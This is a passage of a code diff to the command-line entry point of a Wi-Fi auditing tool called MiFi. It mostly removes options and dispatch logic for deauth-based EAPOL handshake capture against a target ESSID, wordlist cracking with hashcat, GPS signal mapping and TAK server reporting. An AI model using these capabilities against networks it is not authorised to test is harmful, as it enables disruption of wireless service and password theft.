-        default="config/rockyou.txt",
-        required=False,
-        help="Specifies path to custom wordlist. (Default is 'config/rockyou.txt')"
-    )
-
-    # Analyze Mode Options (non-interactive single capture/tool run -- used by
-    # the dashboard's Analysis tab API rather than the interactive process modes)
     analyze_group = parser.add_argument_group('Analyze Mode Options')
     analyze_group.add_argument(
         "-CID", "--capture-id",
@@ -3760,168 +3166,8 @@ if __name__ == "__main__":
     )
 
     # Target Mode Options
-    target_group = parser.add_argument_group('Target Mode Options')
-    target_group.add_argument(
-        "-TID", "--target-id",
-        metavar="<ESSID>",
-        type=str,
-        help="Specific ESSID to target. Filenames may use a sanitized version of the ESSID for safety (e.g., spaces replaced). Refer to logs to ensure accurate matching."
-    )
-    target_group.add_argument(
-        "-TSA", "--target-search-attempts",
-        metavar="<TARGET_SEARCH_ATTEMPTS>",
-        type=int,
-        default=25,
-        help="Number of target search attempts before giving up. Set to 0 for unlimited (Ctrl+C to stop); not allowed in headless mode. (Default is 25)"
-    )
-    target_group.add_argument(
-        "-TA", "--target-attempts",
-        metavar="<CAPTURE_ATTEMPTS>",
-        type=int,
-        default=10,
-        help="Number of deauth attacks to capture an EAPOL handshake before giving up. Set to 0 for unlimited (continues until EAPOL detected or Ctrl+C); not allowed in headless mode. (Default is 10)"
-    )
-
     # Map Mode Options
-    map_group = parser.add_argument_group('Map Mode Options')
-    map_group.add_argument(
-        "-MS", "--map-scans",
-        metavar="<MAP_SCANS>",
-        type=int,
-        default=25,
-        required=False,
-        help="Total number of spectrum scans. Set to 0 for unlimited (Ctrl+C to stop); not allowed in headless mode. (Default is 25)"
-    )
-    map_group.add_argument(
-        "-MSD", "--map-scan-duration",
-        metavar="<MAP_SCAN_DURATION>",
-        type=int,
-        default=1,
-        required=False,
-        help="Scan duration in seconds (s). (Default is 1)"
-    )
-    map_group.add_argument(
-        "-GPS", "--gps-port",
-        metavar="<GPS_PORT>",
-        type=str,
-        default="/dev/ttyUSB0",
-        required=False,
-        help="GPS USB port for signal tracking. (Default is '/dev/ttyUSB0')"
-    )
-    map_group.add_argument(
-        "-GLA", "--gps-lock-attempts",
-        metavar="<GPS_LOCK_ATTEMPTS>",
-        type=int,
-        default=20,
-        required=False,
-        help="Number of attempts to acquire GPS fix before exiting. (Default is 20)"
-    )
-    map_group.add_argument(
-        "-GLW", "--gps-lock-wait",
-        metavar="<GPS_LOCK_WAIT>",
-        type=int,
-        default=5,
-        required=False,
-        help="Time to wait between GPS fix attempts in seconds (s). (Default is 5)"
-    )
-    map_group.add_argument(
-        "-tak", "--tak",
-        action="store_true",
-        required=False,
-        help="Enable TAK server integration to push WiFi network data to TAK server"
-    )
-    map_group.add_argument(
-        "-tak-host", "--tak-host",
-        metavar="<TAK_HOST>",
-        type=str,
-        default=None,
-        required=False,
-        help="TAK server hostname or IP address (required if -tak is used)"
-    )
-    map_group.add_argument(
-        "-tak-port", "--tak-port",
-        metavar="<TAK_PORT>",
-        type=int,
-        default=8087,
-        required=False,
-        help="TAK server port (Default is 8087 for TCP, 8088 for UDP)"
-    )
-    map_group.add_argument(
-        "-tak-protocol", "--tak-protocol",
-        metavar="<TAK_PROTOCOL>",
-        type=str,
-        choices=['tcp', 'udp'],
-        default='tcp',
-        required=False,
-        help="TAK connection protocol: 'tcp' or 'udp' (Default is 'tcp')"
-    )
-    map_group.add_argument(
-        "-tak-cert", "--tak-cert",
-        metavar="<TAK_CERT_FILE>",
-        type=str,
-        default=None,
-        required=False,
-        help="Path to client certificate file for TAK authentication (PEM format)"
-    )
-    map_group.add_argument(
-        "-tak-key", "--tak-key",
-        metavar="<TAK_KEY_FILE>",
-        type=str,
-        default=None,
-        required=False,
-        help="Path to client private key file for TAK authentication (PEM format)"
-    )
-    map_group.add_argument(
-        "-tak-ca", "--tak-ca",
-        metavar="<TAK_CA_FILE>",
-        type=str,
-        default=None,
-        required=False,
-        help="Path to CA certificate file for TAK server verification (PEM format)"
-    )
-    map_group.add_argument(
-        "-tak-token", "--tak-token",
-        metavar="<TAK_API_TOKEN>",
-        type=str,
-        default=None,
-        required=False,
-        help="API token for TAK authentication (alternative to certificates)"
-    )
-
-    # Parse known args first to allow -h/--help/--version without requiring --mode
-    if any(arg in sys.argv for arg in ['-h', '--help', '--version']):
-        # Temporarily make --mode not required for help/version
-        mode_arg = None
-        for action in parser._actions:
-            if action.dest == 'mode':
-                mode_arg = action
-                break
-        if mode_arg:
-            original_required = mode_arg.required
-            mode_arg.required = False
-            parser.parse_args()
-            mode_arg.required = original_required
-        else:
-            parser.parse_args()
-        sys.exit(0)
     args = parser.parse_args()
-
-    # Enforce that --headless is only valid with auto modes
-    if args.headless and not args.mode.endswith("-auto"):
-        parser.error("--headless is only allowed with '-auto' modes.")
-    # Prevent unlimited attempts in headless mode
-    if args.headless:
-        if hasattr(args, 'target_search_attempts') and args.target_search_attempts == 0:
-            parser.error("Unlimited target search attempts (0) is not allowed in headless mode.")
-        if hasattr(args, 'target_attempts') and args.target_attempts == 0:
-            parser.error("Unlimited capture attempts (0) is not allowed in headless mode.")
-        if hasattr(args, 'map_scans') and args.map_scans == 0:
-            parser.error("Unlimited map scans (0) is not allowed in headless mode.")
-    # Remove --target-id requirement for --mode track
-    if args.target_id and not args.mode in ["target"]:
-        parser.error("--target-id can only be used with 'target' mode.")
-    if args.mode == "target" and not args.target_id:
-        parser.error("--target-id is required when using 'target' mode.")
 
     if args.headless and not is_running_under_nohup():
         reexec_with_nohup()
@@ -3952,57 +3198,10 @@ if __name__ == "__main__":
         suite.debug = args.debug if hasattr(args, 'debug') else False  # Apply debug setting
         suite.headless = args.headless
 
-        # Set wordlist and check only for process or full mode
-        if mode_type in ["process", "full"]:
-            suite.word_list = args.word_list
-            if not os.path.isfile(suite.word_list):
-                parser.error(f"Wordlist not found at path: {suite.word_list}")
-
         suite.log(f"MiFi VERSION {__version__}", prefix="blank")
         suite.log(f"MODE: {args.mode}", prefix="blank")
 
         suite.initial_config()
-
-        # Print mode-specific parameters
-        def print_mode_parameters():
-            if mode_type == "collect":
-                suite.log(f"{args.mode} parameters:", prefix="config")
-                suite.log(f"Search:", indent=4, prefix="dot")
-                suite.log(f"Initial scan timeout: {args.initial_scan} seconds", indent=8, prefix="dot")
-                suite.log(f"Target:", indent=4, prefix="dot")
-                suite.log(f"Target monitor timeout: {args.target_scan} seconds", indent=8, prefix="dot")
-                suite.log(f"Deauth packets: {args.packets}", indent=8, prefix="dot")
-            elif mode_type == "target":
-                suite.log(f"{args.mode} parameters:", prefix="config")
-                suite.log(f"Target ESSID: {args.target_id}", indent=4, prefix="dot")
-                suite.log(f"Search:", indent=4, prefix="dot")
-                suite.log(f"Target search attempts: {args.target_search_attempts}", indent=8, prefix="dot")
-                suite.log(f"Target scan timeout: {args.initial_scan} seconds", indent=8, prefix="dot")
-                suite.log(f"Target:", indent=4, prefix="dot")
-                suite.log(f"Capture attempts: {args.target_attempts}", indent=8, prefix="dot")
-                suite.log(f"Target monitor timeout: {args.target_scan} seconds", indent=8, prefix="dot")
-                suite.log(f"Deauth packets: {args.packets}", indent=8, prefix="dot")
-            elif mode_type == "full":
-                suite.log(f"{args.mode} parameters:", prefix="config")
-                suite.log(f"Search:", indent=4, prefix="dot")
-                suite.log(f"Initial scan timeout: {args.initial_scan} seconds", indent=8, prefix="dot")
-                suite.log(f"Target:", indent=4, prefix="dot")
-                suite.log(f"Target monitor timeout: {args.target_scan} seconds", indent=8, prefix="dot")
-                suite.log(f"Deauth packets: {args.packets}", indent=8, prefix="dot")
-                suite.log(f"Wordlist: {args.word_list}", indent=4, prefix="dot")
-            elif mode_type == "process":
-                suite.log(f"{args.mode} parameters:", prefix="config")
-                suite.log(f"Wordlist: {args.word_list}", indent=4, prefix="dot")
-            elif mode_type == "map":
-                suite.log(f"{args.mode} parameters:", prefix="config")
-                suite.log(f"Max scans: {args.map_scans}", indent=4, prefix="dot")
-                suite.log(f"Mapping scan duration: {args.map_scan_duration} seconds", indent=4, prefix="dot")
-                suite.log(f"GPS lock attempts: {args.gps_lock_attempts}", indent=4, prefix="dot")
-                suite.log(f"GPS lock wait: {args.gps_lock_wait} seconds", indent=4, prefix="dot")
-                if args.gps_port:
-                    suite.log(f"GPS port: {args.gps_port}", indent=4, prefix="dot")
-
-        print_mode_parameters()
 
         if mode_type == "config":
             suite.configure_interface()
@@ -4036,175 +3235,6 @@ if __name__ == "__main__":
             elif args.tool == "hashcat":
                 suite.crack_hcx(cap_path, args.word_list, capture_id=args.capture_id)
 
-        elif mode_type == "collect":
-            # Start GPS polling in the collect subprocess so coordinates are
-            # available when register_capture() fires on a confirmed EAPOL.
-            # Non-fatal: if GPS isn't toggled on or gpsd is unreachable,
-            # collection continues but captures will have NULL coordinates.
-            if not (suite.gps_thread and suite.gps_thread.is_alive()):
-                gps_active_from_parent = os.environ.get('MIFI_GPS_ACTIVE', '0') == '1'
-                if gps_active_from_parent:
-                    suite.start_gps_polling()
-            suite.collect(
-                mode=mode_subtype,
-                packets=args.packets,
-                target_scan=args.target_scan,
-                initial_scan=args.initial_scan
-            )
-
-        elif mode_type == "process":
-            suite.process_all(mode=mode_subtype, word_list=args.word_list)
-        
-        elif mode_type == "full":
-            suite.collect(
-                mode=mode_subtype,
-                target_essid=args.target_id,
-                target_scan_attempts=args.target_search_attempts,
-                capture_attempts=args.target_attempts,
-                packets=args.packets,
-                target_scan=args.target_scan,
-                initial_scan=args.initial_scan
-            )
-            suite.process_all(mode=mode_subtype, word_list=args.word_list)
-        
-        elif mode_type == "target":
-            suite.collect(
-                target_essid=args.target_id,
-                target_scan_attempts=args.target_search_attempts,
-                capture_attempts=args.target_attempts,
-                packets=args.packets,
-                target_scan=args.target_scan,
-                initial_scan=args.initial_scan
-            )
-        
-        elif mode_type == "map":
-            # Auto-detect GPS device if not provided or if default doesn't exist
-            gps_device = args.gps_port if args.gps_port else None
-            if not gps_device or (gps_device == "/dev/ttyUSB0" and not os.path.exists("/dev/ttyUSB0")):
-                # Try to detect actual GPS device
-                usb_devices = []
-                try:
-                    usb_devices = glob.glob('/dev/ttyUSB*') + glob.glob('/dev/ttyACM*')
-                    usb_devices = [d for d in usb_devices if d and os.path.exists(d)]
-                    if usb_devices:
-                        gps_device = usb_devices[0]
-                        suite.log(f"Auto-detected GPS device: {gps_device}", indent=4, prefix="check")
-                except Exception:
-                    pass
-            
-            # Use default if still not found
-            if not gps_device:
-                gps_device = "/dev/ttyUSB0"
-            
-            # Check if GPS polling is already active (from parent process/dashboard)
-            # GPS should only be controlled by the GPS toggle button, not by individual modes
-            # However, subprocesses need their own GPS polling thread to connect to gpsd
-            gps_started_by_map_mode = False
-            gps_active_from_parent = os.environ.get('MIFI_GPS_ACTIVE', '0') == '1'
-            if suite.gps_thread and suite.gps_thread.is_alive():
-                suite.log("GPS polling already active from parent process - reusing existing connection", indent=4, prefix="check")
-            elif gps_active_from_parent:
-                # GPS is active in parent process - subprocess still needs its own thread to poll gpsd
-                # The parent manages GPS toggle, but subprocess needs to connect to gpsd for data
-                suite.log("GPS is active in parent process - starting GPS polling thread for subprocess", indent=4, prefix="check")
-                if not suite.start_gps_polling(gps_device=gps_device):
-                    suite.log("Cannot proceed without gpsd. Please start gpsd and try again.", prefix="x")
-                    sys.exit(1)
-                gps_started_by_map_mode = True  # Track that we started it, but don't stop it (parent manages it)
-            else:
-                # GPS not active - map mode can't work without GPS
-                suite.log("GPS not active. Please enable GPS via dashboard toggle or CLI 'gps' command first.", prefix="warning")
-                # For CLI compatibility, allow starting GPS if not in dashboard mode
-                # Start GPS polling (gps3) - pass GPS device for error messages
-                if not suite.start_gps_polling(gps_device=gps_device):
-                    suite.log("Cannot proceed without gpsd. Please start gpsd and try again.", prefix="x")
-                    sys.exit(1)
-                gps_started_by_map_mode = True
-            # gps_serial/init_gps removed in overwatch branch — gps3 via gpsd is the only path
-            
-            # TAK: Initialize TAK connection if enabled (CLI args override config/config.ini)
-            # TAK should work independently in CLI mode - no dependency on dashboard
-            if args.tak or suite.tak_enabled:
-                # Environment variable not set - TAK will be initialized if enabled
-                # This means TAK is not connected in the dashboard, so map mode needs its own connection
-                # Initialize TAK connection if enabled (CLI args override config/config.ini)
-                # Only initialize if not already connected via environment
-                # CLI arguments override config/config.ini values
-                tak_host = args.tak_host if args.tak_host else suite.tak_host
-                tak_port = args.tak_port if args.tak_port else suite.tak_port
-                tak_protocol = args.tak_protocol if args.tak_protocol else suite.tak_protocol
-                tak_cert = args.tak_cert if args.tak_cert else suite.tak_cert_file
-                tak_key = args.tak_key if args.tak_key else suite.tak_key_file
-                tak_ca = args.tak_ca if args.tak_ca else suite.tak_ca_file
-                tak_token = args.tak_token if args.tak_token else suite.tak_api_token
-                
-                if not tak_host:
-                    suite.log("TAK host required. Configure in config/config.ini [TAK] section or use -tak-host flag.", prefix="x")
-                    sys.exit(1)
-                
-                suite.log("Initializing TAK server connection...", prefix="config")
-                tak_connected = suite.init_tak_connection(
-                    host=tak_host,
-                    port=tak_port,
-                    protocol=tak_protocol,
-                    cert_file=tak_cert,
-                    key_file=tak_key,
-                    ca_file=tak_ca,
-                    api_token=tak_token
-                )
-                
-                if not tak_connected:
-                    suite.log("", prefix="blank")
-                    suite.log("TAK Server connection failed. Troubleshooting steps:", prefix="x")
-                    suite.log("", prefix="blank")
-                    suite.log("1. Verify TAK server is running and accessible:", indent=4, prefix="dot")
-                    suite.log(f"   ping {tak_host}", indent=8, prefix="dot")
-                    suite.log(f"   telnet {tak_host} {tak_port}", indent=8, prefix="dot")
-                    suite.log("", prefix="blank")
-                    suite.log("2. Check network connectivity and firewall rules:", indent=4, prefix="dot")
-                    suite.log(f"   Ensure port {tak_port} is open and accessible", indent=8, prefix="dot")
-                    suite.log("", prefix="blank")
-                    if tak_cert or tak_key:
-                        suite.log("3. Verify certificate files exist and are readable:", indent=4, prefix="dot")
-                        if tak_cert:
-                            suite.log(f"   Certificate: {tak_cert} {'[OK]' if os.path.exists(tak_cert) else '[NOT FOUND]'}", indent=8, prefix="dot")
-                        if tak_key:
-                            suite.log(f"   Private Key: {tak_key} {'[OK]' if os.path.exists(tak_key) else '[NOT FOUND]'}", indent=8, prefix="dot")
-                        if tak_ca:
-                            suite.log(f"   CA Certificate: {tak_ca} {'[OK]' if os.path.exists(tak_ca) else '[NOT FOUND]'}", indent=8, prefix="dot")
-                        suite.log("", prefix="blank")
-                    suite.log("4. Check config/config.ini [TAK] section or CLI arguments:", indent=4, prefix="dot")
-                    suite.log(f"   Host: {tak_host}", indent=8, prefix="dot")
-                    suite.log(f"   Port: {tak_port}", indent=8, prefix="dot")
-                    suite.log(f"   Protocol: {tak_protocol.upper()}", indent=8, prefix="dot")
-                    suite.log("", prefix="blank")
-                    suite.log("5. Review TAK server logs for connection attempts", indent=4, prefix="dot")
-                    suite.log("", prefix="blank")
-                    suite.log("6. Test connection manually:", indent=4, prefix="dot")
-                    suite.log(f"   telnet {tak_host} {tak_port}", indent=8, prefix="dot")
-                    suite.log(f"   # Or use: nc -zv {tak_host} {tak_port}", indent=8, prefix="dot")
-                    suite.log("", prefix="blank")
-                    suite.log("For detailed setup instructions, see: tak/TAK_SERVER_SETUP.md", indent=4, prefix="dot")
-                    suite.log("", prefix="blank")
-                    suite.log("Cannot proceed without TAK connection. Exiting.", prefix="x")
-                    sys.exit(1)
-            # Ensure interface is configured
-            suite.configure_interface()
-            # Start signal mapping
-            # NEVER close TAK connection - TAK is managed by the dashboard toggle
-            # TAK connection should only be closed when the user toggles it off
-            # Map mode should use existing TAK connection, not create/close its own
-            # NEVER stop GPS polling - GPS is managed by the GPS toggle button/dashboard
-            # GPS polling should only start/stop via the GPS toggle, not by individual modes
-            # Map mode should only use existing GPS polling, never stop it
-            # Removed GPS stop logic - GPS is persistent and managed separately
-            success = suite.start_signal_tracking(
-                max_attempts=args.map_scans,
-                scan_interval=args.map_scan_duration,
-                gps_lock_attempts=args.gps_lock_attempts,
-                gps_lock_wait=args.gps_lock_wait
-            )
-        
         elif mode_type == "clean":
             suite.clean_mode()
 
